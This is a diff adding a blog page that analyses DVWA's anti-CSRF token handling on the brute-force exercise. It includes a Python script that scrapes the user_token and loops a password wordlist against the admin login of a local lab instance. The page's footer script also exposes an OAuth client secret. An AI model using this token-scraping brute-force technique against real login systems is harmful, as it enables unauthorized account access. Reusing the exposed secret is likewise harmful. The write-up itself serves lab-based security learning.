@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      DVWA之Anti CSRF分析利用(python3+Brute Password) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>DVWA之Anti CSRF分析利用(python3+Brute Password)</h2>
+  <p class="post-date">2019-02-20 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。</p>
+<h1 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h1><h2 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h2><p>index.php&gt;&gt;点击submit之后跳转脚本login.php中<br>主要方法分析:</p>
+<h2 id="dvwaPage-inc-php"><a href="#dvwaPage-inc-php" class="headerlink" title="dvwaPage.inc.php"></a>dvwaPage.inc.php</h2><p>generateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端<br><img src="./1.png" alt=""><br>generateSessionToken()方法&gt;&gt;判断当前界面是否存在session_token，若存在销毁上一个sessionID 并创建一个新的session_token。不存在直接创建session_token<br><img src="./2.png" alt=""></p>
+<h2 id="Anti-CSRF执行流程"><a href="#Anti-CSRF执行流程" class="headerlink" title="Anti-CSRF执行流程"></a>Anti-CSRF执行流程</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>user_token的提交是怎么被赋值?session_token和user_token是怎么验证相等?<br>问题一:查看源代码如下，$session[‘session_token’]放置于标签name=’’user_token中。<br>在login.php的验证执行，通过reuqests[‘user_token’]方式提取name=’user_token’对应的value值<br>问题二:在运行的login.php脚本中调用checkToken方法检验session_token和user_token值是否相等<br><img src="./3.png" alt=""><br><img src="./4.png" alt=""></p>
+<p>每次访问或跳转至index.php时会调用dvwaPage.inic.php（写有Token Function的文件）。<br><img src="./5.png" alt=""></p>
+<h2 id="token-user成长历程"><a href="#token-user成长历程" class="headerlink" title="token_user成长历程"></a>token_user成长历程</h2><ol>
+<li>index.php中&gt;&gt;检查页面是否已存在session_token</li>
+<li>index.php中&gt;&gt;存在，销毁session_token，并创建一个新的session_token</li>
+<li>index.php中&gt;&gt;执行tokenFied()方法，将session_token放置标签中(可以在index.php中审查源码可以看到session_token值)<br>可以看出这里存在BUG，爆破密码可以先提取网页源码中的user_Token进行payload构建。再爆破密码</li>
+<li>login.php&gt;&gt;验证user_token是否与脚本中的session_token相等<br><img src="./6.png" alt=""><br><img src="./7.png" alt=""><br><img src="./6.png" alt=""></li>
+</ol>
+<h2 id="Brute-password-High"><a href="#Brute-password-High" class="headerlink" title="Brute password(High)"></a>Brute password(High)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">def getToken(url,header):</span><br><span class="line">	try:</span><br><span class="line">		r &#x3D; requests.get(url,headers&#x3D;header)</span><br><span class="line">		print (r.status_code)</span><br><span class="line">		print (len(r.text))</span><br><span class="line">		r.raise_for_status()</span><br><span class="line">		r.encoding&#x3D;r.apparent_encoding</span><br><span class="line">		soup &#x3D; BeautifulSoup(r.text,&#39;html.parser&#39;)</span><br><span class="line">		token &#x3D; soup.find_all(&#39;input&#39;)</span><br><span class="line">		str1 &#x3D; str(token[3])</span><br><span class="line">		new_token &#x3D; str1[46:-11]</span><br><span class="line">		return new_token</span><br><span class="line">	except:</span><br><span class="line">		return &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">&#39;Host&#39;:&#39;192.168.43.195&#39;,</span><br><span class="line">&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&#39;,</span><br><span class="line">&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">&#39;Referer&#39;: &#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;index.php&#39;,</span><br><span class="line">&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">&#39;Cookie&#39;: &#39;security&#x3D;high; PHPSESSID&#x3D;adf974919653a77c8befadca017f92e7&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;index.php&#39;</span><br><span class="line">i&#x3D;0</span><br><span class="line">str3&#x3D;&#39;&#39;</span><br><span class="line">new_token&#x3D;getToken(url,header)</span><br><span class="line">for line in open(&quot;D:&#x2F;&#x2F;rkolin.txt&quot;):</span><br><span class="line">	requal &#x3D;&#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;&#39;+&quot;?username&#x3D;admin&amp;password&#x3D;&quot;+line.strip()+&quot;&amp;Login&#x3D;Login&amp;user_token&#x3D;&quot;+new_token</span><br><span class="line">	new_token&#x3D;getToken(requal,header)</span><br><span class="line">	i &#x3D; i+1</span><br><span class="line">	print(i,&#39;admin&#39;,new_token,requal)</span><br><span class="line">	if (i &#x3D;&#x3D; 10):</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
+<p><img src="./8.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>high等级，在爆破密码这一关的，就可以通过python现在index.php直接获取user_token值</li>
+<li>把session_id放置于服务器端且无法不能在前端可见之处进行验证</li>
+<li>审计Anti机制挺有意思，虽然这个比较简单，但还是满有收获的。</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CSRF" >
+    <span class="tag-code">CSRF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/">
+        <span class="nav-arrow">← </span>
+        
+          sql盲注(附python脚本)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">
+        
+          PHP之GET传参黑名单绕过
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Begin"><span class="toc-nav-text">Begin</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NOTICE"><span class="toc-nav-text">NOTICE</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#dvwaPage-inc-php"><span class="toc-nav-text">dvwaPage.inc.php</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Anti-CSRF执行流程"><span class="toc-nav-text">Anti-CSRF执行流程</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#问题"><span class="toc-nav-text">问题</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#token-user成长历程"><span class="toc-nav-text">token_user成长历程</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Brute-password-High"><span class="toc-nav-text">Brute password(High)</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#总结"><span class="toc-nav-text">总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/02/20/DVWA之Anti-CSRF分析利用/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "DVWA之Anti CSRF分析利用(python3+Brute Password)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
